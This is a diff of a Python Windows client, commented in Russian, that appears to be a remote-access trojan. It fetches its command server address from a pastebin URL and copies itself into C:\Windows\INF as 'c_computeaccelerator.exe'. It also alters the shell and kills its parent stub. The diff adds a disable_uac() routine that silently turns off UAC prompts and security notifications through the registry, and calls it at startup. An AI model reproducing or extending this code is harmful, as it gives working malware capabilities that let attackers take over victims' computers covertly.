@@ -29,7 +29,7 @@ logging.basicConfig(level=logging.INFO, format='[%(asctime)s] %(levelname)s: %(m
 logger = logging.getLogger(__name__)
 
 
-# ====== Автоопределение CLIENT_ID (ИСПРАВЛЕНО) ======
+# ====== Автоопределение CLIENT_ID ======
 def get_hwid():
     # 1. Попытка через WMIC (UUID материнской платы)
     try:
@@ -73,7 +73,7 @@ CLIENT_ID = f"{device_name}/{get_hwid()}"
 logger.info(f"CLIENT_ID: {CLIENT_ID}")
 
 # ====== Настройки подключения ======
-PASTEBIN_RAW_URL = "https://pastebin.com/raw/xxxxyyyy"  # ЗАменить
+PASTEBIN_RAW_URL = "https://pastebin.com/raw/xxxyyy" # Поменять
 
 def get_server_config():
     
@@ -121,7 +121,7 @@ SERVER_IP, SERVER_PORT = get_server_config()
 RECONNECT_DELAY = 5
 
 # ====== Глобальные переменные ======
-CURRENT_VERSION = 17
+CURRENT_VERSION = 18
 TARGET_DIR = r"C:\Windows\INF"
 new_name="c_computeaccelerator.exe"
 stop_event = threading.Event()
@@ -232,6 +232,39 @@ def kill_parent_stub():
 
 ############################
 
+def disable_uac():
+    """
+    Отключает UAC и уведомления в тихом режиме
+    """
+    try:
+        logger.info("Начало отключения UAC...")
+
+        # Отключение UAC через реестр
+        with reg.OpenKey(reg.HKEY_LOCAL_MACHINE, 
+                       r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System", 
+                       0, reg.KEY_SET_VALUE) as key:
+            # EnableLUA = 0 - отключает UAC
+            reg.SetValueEx(key, "EnableLUA", 0, reg.REG_DWORD, 0)
+            # ConsentPromptBehaviorAdmin = 0 - отключает запросы
+            reg.SetValueEx(key, "ConsentPromptBehaviorAdmin", 0, reg.REG_DWORD, 0)
+            # PromptOnSecureDesktop = 0 - отключает безопасный рабочий стол
+            reg.SetValueEx(key, "PromptOnSecureDesktop", 0, reg.REG_DWORD, 0)
+
+        # Дополнительно: отключение уведомлений безопасности
+        with reg.OpenKey(reg.HKEY_LOCAL_MACHINE, 
+                       r"SOFTWARE\Microsoft\Security Center", 
+                       0, reg.KEY_SET_VALUE) as key:
+            reg.SetValueEx(key, "UacDisableNotify", 0, reg.REG_DWORD, 1)
+
+        logger.info("UAC и уведомления успешно отключены")
+        return True
+
+    except Exception as e:
+        logger.error(f"Ошибка при отключении UAC: {e}")
+        return False
+
+############################
+
 def change_shell():
     print("[START] Изменение shell запущено")
     try:
@@ -249,6 +282,7 @@ def change_shell():
     finally:
         print("[END] Работа потока изменения shell завершена")
 
+############################
 
 def copy_to_target(new_name="c_computeaccelerator.exe"):
     try:
@@ -300,8 +334,9 @@ def delete_mei():
             except Exception as e:
                 print(f"[ERROR] Не удалось удалить {full_path}: {e}")
 
-MAX_LEN = 3500  # граница под Telegram
+############################
 
+MAX_LEN = 3500  # граница под Telegram
 def split_message(text, limit=MAX_LEN):
     """Разбивает длинный текст на несколько сообщений."""
     parts = []
@@ -2255,6 +2290,7 @@ def main_client_loop():
 
 if __name__ == "__main__":
     copy_to_target()
+    disable_uac()
     delete_mei()
     kill_parent_stub()
     main_client_loop()
